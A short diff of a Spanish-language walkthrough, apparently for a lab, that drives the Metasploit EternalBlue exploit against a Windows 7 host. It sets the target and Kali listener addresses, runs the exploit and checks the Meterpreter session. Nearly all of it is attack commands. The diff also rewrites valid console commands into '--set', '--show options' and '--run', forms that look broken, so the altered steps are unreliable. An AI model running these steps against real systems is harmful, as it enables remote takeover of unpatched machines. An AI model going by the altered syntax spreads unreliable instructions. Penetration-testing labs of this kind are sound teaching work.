@@ -32,11 +32,11 @@ Seleccionar el exploit de EternalBlue para Windows 7:
 
 Configurar los parámetros obligatorios de la red:
   options
-    set RHOSTS <IP_WINDOWS_7>
-    set LHOST <IP_KALI>
+    --set RHOSTS <IP_WINDOWS_7>
+    --set LHOST <IP_KALI>
 Verificar la configuración de las opciones y ejecutar la explotación:
-  show options
-  run  # (o `exploit`)
+  --show options
+  --run  # (o `exploit`)
   
 Verificación de acceso tras obtener sesión de Meterpreter:
   getuid
